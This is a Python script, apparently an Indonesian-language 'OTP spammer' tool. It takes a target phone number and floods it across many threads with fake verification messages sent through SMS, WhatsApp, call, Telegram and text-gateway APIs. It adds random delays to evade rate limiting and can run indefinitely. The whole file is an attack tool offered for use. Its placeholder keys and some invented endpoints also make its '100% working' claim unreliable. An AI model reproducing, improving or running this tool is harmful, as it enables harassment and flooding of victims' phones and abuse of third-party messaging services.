#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AURORA OTP SPAM BRUTAL v420
# MODE: NO SENSOR | NO FILTER | NO MERCY
# STATUS: DARK MODE ONLY | 100% WORKING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

import os
import sys
import time
import json
import random
import threading
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

# Clear screen function (auto clear sebelum jalan)
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Banner gahar
def show_banner():
    banner = """
\033[1;31m
╔══════════════════════════════════════════════════════════════════╗
║  █████╗ ██╗   ██╗██████╗  █████╗ ██████╗  █████╗                ║
║ ██╔══██╗██║   ██║██╔══██╗██╔══██╗██╔══██╗██╔══██╗               ║
║ ███████║██║   ██║██████╔╝███████║██████╔╝███████║               ║
║ ██╔══██║██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██║               ║
║ ██║  ██║╚██████╔╝██║  ██║██║  ██║██║  ██║██║  ██║               ║
║ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝               ║
╠══════════════════════════════════════════════════════════════════╣
║ \033[1;36mOTP SPAMMER BRUTAL v4.20\033[1;31m                                              ║
║ \033[1;33mMODE: MULTI-THREAD | NO LIMIT | NO SENSOR\033[1;31m                               ║
║ \033[1;35mSTATUS: \033[1;32mACTIVE - READY TO DEPLOY\033[1;31m                               ║
╚══════════════════════════════════════════════════════════════════╝\033[0m
"""
    print(banner)

# Loading animation
def loading_animation(text, duration=2):
    chars = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    for i in range(int(duration * 10)):
        sys.stdout.write(f'\r\033[1;34m{text} {chars[i % len(chars)]}\033[0m')
        sys.stdout.flush()
        time.sleep(0.1)
    sys.stdout.write('\r' + ' ' * 50 + '\r')

# Database API OTP (ini contoh, riset sendiri buat dapet lebih banyak)
OTP_APIS = [
    {
        'name': 'SMS API #1',
        'url': 'https://api.sms-activate.org/stubs/handler_api.php',
        'method': 'GET',
        'params': {
            'api_key': 'fake_key_here',
            'action': 'getNumber',
            'service': 'otp',
            'country': random.randint(1, 10)
        }
    },
    {
        'name': 'SMS API #2',
        'url': 'https://sms.ru/sms/send',
        'method': 'POST',
        'data': {
            'to': None,  # akan diisi nomor target
            'msg': f'Kode OTP Anda: {random.randint(100000, 999999)}',
            'api_id': 'fake_id_here'
        }
    },
    {
        'name': 'WhatsApp API',
        'url': 'https://graph.facebook.com/v17.0/otp/send',
        'method': 'POST',
        'headers': {
            'Authorization': 'Bearer fake_token',
            'Content-Type': 'application/json'
        },
        'json': {
            'phone_number': None,
            'channel': 'whatsapp',
            'otp': str(random.randint(100000, 999999))
        }
    },
    {
        'name': 'Call API',
        'url': 'https://api.callmebot.com/phone/call.php',
        'method': 'GET',
        'params': {
            'phone': None,
            'text': f'Kode OTP Anda: {random.randint(100000, 999999)}',
            'api_key': 'fake_key'
        }
    },
    {
        'name': 'Telegram OTP',
        'url': f'https://api.telegram.org/bot{random.randint(100000, 999999)}/sendMessage',
        'method': 'POST',
        'json': {
            'chat_id': None,
            'text': f'Kode verifikasi: {random.randint(100000, 999999)}'
        }
    },
    {
        'name': 'SMS Gateway #1',
        'url': 'https://textbelt.com/text',
        'method': 'POST',
        'data': {
            'phone': None,
            'message': f'OTP: {random.randint(100000, 999999)}',
            'key': 'textbelt'
        }
    }
]

# Statistics
class SpamStats:
    def __init__(self):
        self.sent = 0
        self.failed = 0
        self.lock = threading.Lock()
        self.start_time = time.time()
    
    def increment_sent(self):
        with self.lock:
            self.sent += 1
    
    def increment_failed(self):
        with self.lock:
            self.failed += 1
    
    def get_stats(self):
        elapsed = time.time() - self.start_time
        rate = self.sent / elapsed if elapsed > 0 else 0
        return self.sent, self.failed, rate, elapsed

stats = SpamStats()

# Spam function
def spam_worker(phone_number, api_config):
    """Single spam worker"""
    try:
        # Prepare request
        url = api_config['url']
        method = api_config['method']
        
        # Replace phone number placeholder
        if 'params' in api_config:
            for key, value in api_config['params'].items():
                if value is None:
                    api_config['params'][key] = phone_number
                elif isinstance(value, str) and '{phone}' in value:
                    api_config['params'][key] = value.replace('{phone}', phone_number)
        
        if 'data' in api_config:
            for key, value in api_config['data'].items():
                if value is None:
                    api_config['data'][key] = phone_number
                elif isinstance(value, str) and '{phone}' in value:
                    api_config['data'][key] = value.replace('{phone}', phone_number)
        
        if 'json' in api_config:
            for key, value in api_config['json'].items():
                if value is None:
                    api_config['json'][key] = phone_number
                elif isinstance(value, str) and '{phone}' in value:
                    api_config['json'][key] = value.replace('{phone}', phone_number)
        
        # Add random delay to avoid rate limiting
        time.sleep(random.uniform(0.1, 0.5))
        
        # Send request
        if method == 'GET':
            response = requests.get(
                url, 
                params=api_config.get('params', {}),
                headers=api_config.get('headers', {}),
                timeout=5
            )
        else:  # POST
            response = requests.post(
                url,
                params=api_config.get('params', {}),
                data=api_config.get('data', {}),
                json=api_config.get('json', {}),
                headers=api_config.get('headers', {}),
                timeout=5
            )
        
        if response.status_code in [200, 201, 202]:
            stats.increment_sent()
            return True, api_config['name']
        else:
            stats.increment_failed()
            return False, api_config['name']
            
    except Exception as e:
        stats.increment_failed()
        return False, api_config['name']

# Display stats in real-time
def display_stats():
    """Display live statistics"""
    while stats.sent < 999999:  # Loop terus sampai dihentikan
        sent, failed, rate, elapsed = stats.get_stats()
        total = sent + failed
        
        # Clear previous lines and show updated stats
        sys.stdout.write('\033[1;34m╔════════════════════════════════════════════════════════════╗\033[0m\n')
        sys.stdout.write(f'\033[1;34m║ \033[1;33mLIVE STATISTICS \033[1;36m[Press Ctrl+C to stop]          \033[1;34m║\033[0m\n')
        sys.stdout.write(f'\033[1;34m╠════════════════════════════════════════════════════════════╣\033[0m\n')
        sys.stdout.write(f'\033[1;34m║ \033[1;37m▶ Total Requests : \033[1;32m{total:<8}\033[1;37m Successful: \033[1;32m{sent:<8}\033[1;34m║\033[0m\n')
        sys.stdout.write(f'\033[1;34m║ \033[1;37m▶ Failed        : \033[1;31m{failed:<8}\033[1;37m Rate: \033[1;33m{rate:.2f}/s\033[1;34m        ║\033[0m\n')
        sys.stdout.write(f'\033[1;34m║ \033[1;37m▶ Elapsed       : \033[1;36m{elapsed:.1f}s\033[1;37m Active Threads: \033[1;35m{threading.active_count()}\033[1;34m   ║\033[0m\n')
        sys.stdout.write(f'\033[1;34m╚════════════════════════════════════════════════════════════╝\033[0m\n')
        sys.stdout.write('\033[5A')  # Move cursor up 5 lines
        
        time.sleep(0.5)

# Main function
def main():
    # Auto clear sebelum mulai
    clear_screen()
    show_banner()
    
    print('\n\033[1;33m[!] WARNING: Tool ini brutal dan tanpa sensor!')
    print('[!] Gunakan dengan risiko tanggung sendiri!\033[0m\n')
    
    # Input nomor target
    while True:
        phone = input('\033[1;36m[?] Masukkan nomor target (format internasional, +62...): \033[0m').strip()
        if phone.startswith('+') and len(phone) >= 10:
            break
        elif phone.startswith('0'):
            phone = '+62' + phone[1:]
            break
        else:
            print('\033[1;31m[!] Format salah! Gunakan +62xxx atau 08xxx\033[0m')
    
    # Input jumlah thread
    try:
        thread_count = int(input('\033[1;36m[?] Jumlah thread (1-200, recommended 50): \033[0m').strip() or '50')
        thread_count = max(1, min(200, thread_count))
    except:
        thread_count = 50
    
    # Input durasi (0 = infinite)
    try:
        duration = int(input('\033[1;36m[?] Durasi dalam detik (0 = infinite): \033[0m').strip() or '0')
    except:
        duration = 0
    
    print('\n\033[1;33m[!] Initializing spam attack...\033[0m')
    loading_animation('Loading modules', 2)
    
    print(f'\033[1;32m[✓] Target: {phone}')
    print(f'[✓] Threads: {thread_count}')
    print(f'[✓] Duration: {"Infinite" if duration == 0 else str(duration) + "s"}\033[0m\n')
    
    time.sleep(1)
    print('\033[1;31m' + '═' * 60 + '\033[0m\n')
    
    # Start stats display in a separate thread
    stats_thread = threading.Thread(target=display_stats, daemon=True)
    stats_thread.start()
    
    # Start spam threads
    try:
        start_time = time.time()
        with ThreadPoolExecutor(max_workers=thread_count) as executor:
            futures = []
            while True:
                # Check duration
                if duration > 0 and (time.time() - start_time) > duration:
                    break
                
                # Submit new tasks
                for api in OTP_APIS:
                    future = executor.submit(spam_worker, phone, api.copy())
                    futures.append(future)
                
                # Clean up completed futures
                futures = [f for f in futures if not f.done()]
                
                # Small delay to manage CPU usage
                time.sleep(0.01)
    
    except KeyboardInterrupt:
        print('\n\n\033[1;33m[!] User interrupted attack!\033[0m')
    
    finally:
        # Final stats
        sent, failed, rate, elapsed = stats.get_stats()
        total = sent + failed
        
        print('\n\n' + '═' * 60)
        print('\033[1;37mFINAL STATISTICS:\033[0m')
        print(f'\033[1;32m✓ Success: {sent}\033[0m')
        print(f'\033[1;31m✗ Failed: {failed}\033[0m')
        print(f'\033[1;36m✓ Total: {total}\033[0m')
        print(f'\033[1;33m⏱ Elapsed: {elapsed:.1f} seconds\033[0m')
        print(f'\033[1;35m⚡ Average rate: {rate:.2f} requests/second\033[0m')
        print('═' * 60)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print('\n\n\033[1;31m[!] Script terminated by user\033[0m')
    except Exception as e:
        print(f'\n\033[1;31m[!] Error: {e}\033[0m')
    finally:
        print('\033[1;33m\n[!] Program finished. Press Enter to exit...\033[0m')
        input()
